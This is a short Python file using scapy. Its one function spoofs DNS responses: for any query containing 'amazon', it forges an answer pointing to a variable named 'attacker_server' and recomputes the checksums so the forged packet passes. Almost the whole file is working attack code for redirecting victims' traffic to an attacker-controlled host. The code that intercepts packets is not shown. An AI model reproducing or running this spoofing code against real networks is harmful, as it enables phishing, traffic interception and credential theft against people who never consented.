import scapy.all as scapy


def pkt_payload(scapy_packet):
    name = "amazon"
    attacker_server = "192.168.0.27"

    if "DNS" in scapy_packet:
        query = str(scapy_packet["DNS"].qd.qname)
        if query.find(name) != -1 and scapy_packet["DNS"].ancount > 0:
            scapy_packet["DNS"] = scapy.DNS(id=scapy_packet["DNS"].id, qr=1, ra=1, ancount=1, qd=scapy.DNSQR(qname=scapy_packet[
                "DNS"].qd.qname, qtype='A', qclass='IN'), an=scapy.DNSRR(rrname=scapy_packet[
                "DNS"].qd.qname, rdata=attacker_server))

            # deleting packet length and checksum to force scapy recalculate fields
            del scapy_packet["IP"].len
            del scapy_packet["IP"].chksum
            del scapy_packet["UDP"].len
            del scapy_packet["UDP"].chksum
    return scapy_packet

